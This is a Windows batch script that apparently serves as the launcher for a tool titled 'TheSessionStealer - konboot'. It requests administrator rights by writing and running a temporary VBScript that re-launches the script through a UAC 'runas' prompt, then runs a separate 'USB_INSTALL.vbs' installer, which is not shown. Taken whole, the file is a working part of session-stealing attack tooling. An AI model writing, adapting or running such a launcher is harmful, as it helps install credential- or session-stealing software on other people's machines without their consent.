@echo off
title TheSessionStealer - konboot
        ATTRIB %windir%\system32 -h | FINDSTR /I "system32" >nul
        IF %ERRORLEVEL% NEQ 1 (
                cd /D %~dp0
				if not exist "getadmin.vbs" (
  				  	mode con lines=2 cols=30
  				    echo Set UAC = CreateObject^("Shell.Application"^)>getadmin.vbs
  				    echo UAC.ShellExecute %0, "", "", "runas", 1 >>getadmin.vbs
  				    call wscript getadmin.vbs
  				    del getadmin.vbs
  				    exit
   				    )
			    del getadmin.vbs
        )
@setlocal enableextensions
@cd /d "%~dp0"
cmd.exe /K "%CD%\USB_INSTALL.vbs"
exit